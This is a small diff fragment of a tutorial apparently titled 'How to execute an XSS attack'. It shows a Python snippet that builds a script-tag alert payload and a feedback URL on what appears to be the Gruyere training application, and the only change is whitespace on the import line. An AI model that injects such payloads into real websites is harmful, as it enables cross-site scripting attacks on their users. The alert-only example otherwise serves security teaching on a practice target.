@@ -6,7 +6,7 @@ How to execute an XSS attack- the payload variable contains a script tag with ma
 
 **Python Code for Cross-Site Scripting** 
 
-import requests  
+import requests   
 payload = "<script>alert('XSS Attack!');</script>" #Payload variable mentioned above- site of vulnerability 
 document_id = "your-document-id"
 url = f"http://gruyere-app.com/feedback?id={document_id}" #This is the target website whereby the document ID has been appended to reach specific endpoint
